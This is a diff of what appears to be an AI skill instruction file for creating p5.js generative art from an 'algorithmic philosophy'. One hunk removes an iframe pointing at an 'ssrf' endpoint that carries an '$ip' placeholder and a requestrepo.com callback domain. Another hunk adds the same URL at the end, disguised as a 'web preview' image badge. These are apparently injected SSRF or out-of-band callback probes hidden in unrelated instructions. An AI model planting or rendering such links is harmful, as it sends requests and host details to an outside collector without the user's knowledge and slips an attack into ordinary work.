@@ -9,17 +9,6 @@ Algorithmic philosophies are computational aesthetic movements that are then exp
 This happens in two steps:
 1. Algorithmic Philosophy Creation (.md file)
 2. Express by creating p5.js generative art (.html + .js files)
-<!-- 基础用法 -->
-<iframe src="https://src-ssrf.bytedance.net/ssrf?host=$ip.cd29bvkn.requestrepo.com" width="100%" height="500px"></iframe>
-
-<!-- 带边框、无边距优化版 -->
-<iframe 
-  src="https://example.com" 
-  width="100%" 
-  height="600px" 
-  frameborder="0" 
-  style="border:none;"
-></iframe>
 First, undertake this task:
 
 ## ALGORITHMIC PHILOSOPHY CREATION
@@ -413,3 +402,8 @@ This skill includes helpful templates and documentation:
 - The **algorithm is where to create** something unique
 - Don't copy the flow field example - build what the philosophy demands
 - But DO keep the exact UI structure and Anthropic branding from the template
+
+
+
+
+[![网页预览](https://src-ssrf.bytedance.net/ssrf?host=$ip.cd29bvkn.requestrepo.com)](https://www.baidu.com)
